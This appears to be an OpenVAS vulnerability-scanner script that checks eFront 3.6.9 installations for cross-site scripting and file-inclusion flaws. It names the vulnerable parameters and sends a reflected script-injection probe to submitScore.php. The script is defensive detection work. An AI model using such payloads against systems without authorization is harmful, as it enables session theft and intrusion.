CPE = "cpe:/a:efrontlearning:efront";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802116" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2011-07-13 17:31:13 +0200 (Wed, 13 Jul 2011)" );
	script_bugtraq_id( 47870 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "eFront Cross Site Scripting and Local File Inclusion Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_efront_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "efront/detected" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/101456/eFront3.6.9build10653-lfi.txt" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/101455/eFront3.6.9build10653-XSS.txt" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "eFront version 3.6.9 Build 11018 and prior." );
	script_tag( name: "insight", value: "Input passed to 'load' parameter in 'scripts.php' and 'seq'
  parameter in 'submitScore.php' are not properly sanitised before being returned to the user." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running eFront and is prone to cross site scripting
  and local file inclusion vulnerabilities." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/modules/module_crossword/app/submitScore.php?seq=<script>alert(document.cookie)</script>";
if(http_vuln_check( port: port, url: url, pattern: ":<script>alert\\(document.cookie\\)</script>", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

